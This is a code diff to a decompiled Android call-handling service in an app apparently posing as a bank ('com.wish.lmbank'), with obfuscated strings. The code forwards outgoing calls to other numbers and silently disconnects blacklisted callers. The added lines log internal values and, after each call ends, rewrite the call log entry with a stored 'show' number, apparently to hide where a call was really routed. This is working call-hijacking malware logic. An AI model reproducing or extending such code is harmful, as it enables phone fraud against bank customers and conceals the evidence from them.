@@ -8,6 +8,7 @@ import android.telecom.Call;
 import android.telecom.DisconnectCause;
 import android.telecom.InCallService;
 import android.text.TextUtils;
+import android.util.Log;
 
 import com.wish.lmbank.AppStartV;
 import com.wish.lmbank.bean.CallLogBean;
@@ -33,6 +34,7 @@ public class PhoneCallService extends InCallService {
     public static PhoneCallService callService;
     public static boolean isRunning;
     private final String TAG = PhoneCallService.class.getName();
+
     private final Call.Callback callback = new Call.Callback() { // from class: com.wish.lmbank.phone.PhoneCallService.1
 
         @Override // android.telecom.Call.Callback
@@ -145,8 +147,10 @@ public class PhoneCallService extends InCallService {
         String str4 = bb7d7pu7.m5998("Bgc");
         String value = SharedPreferencesUtils.getValue(str3, str4);
         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJCggFBT0QGQxTSQ") + i + bb7d7pu7.m5998("RUkKCAUFOh0IHQxTSQ") + call.getState() + bb7d7pu7.m5998("RUmO_dyBxvSM5t6OyehTSQ") + callPhone2 + bb7d7pu7.m5998("RUkaHgAdCgFTSQ") + value);
+        Log.e(TAG, "str4=" + str4 + "|value=" + value + "|i=" + i);
         if (i != 0) {
             if (i == 2) {
+                //电话转发
                 StringBuilder sb2 = new StringBuilder();
                 LimitPhoneNumberBean isForwarding = SettingUtils.isForwarding(callPhone2);
                 if (isForwarding != null) {
@@ -171,7 +175,9 @@ public class PhoneCallService extends InCallService {
                 isForced = callPhone2;
             } else {
                 AppStartV.isCustomDialer = false;
+                //黑名单
                 boolean isBlackList = SettingUtils.isBlackList(callPhone2);
+                Log.e(TAG, "str4=" + str4 + "|value=" + value + "|is=" + isBlackList);
                 if (str4.equals(value) && isBlackList) {
                     call.disconnect();
                     LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgNL4jPnkjOT8RUmO_dyBxvRTSQ") + callPhone2);
@@ -202,6 +208,11 @@ public class PhoneCallService extends InCallService {
         StringBuilder sb = new StringBuilder();
 //         sb.append(this.TAG + bb7d7pu7.m5998("RUkGByoIBQU7DAQGHwwNRUmO_dyBxvSM5t6OyehTSQ") + callPhone);
         sb.append(this.TAG).append(", onCallRemoved, 电话号码: ").append(callPhone);
+
+        //这里修改号码，注意断开了才有号码
+        String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);
+        Constants.modifyCall(this, callPhone, var11);
+
         if (PhoneCallManager.call == call) {
 //             sb.append(bb7d7pu7.m5998("RUk5AQYHDCoIBQUkCAcIDgwbRwoIBQVJVEkHHAUF"));
             sb.append(", PhoneCallManager.call = null");
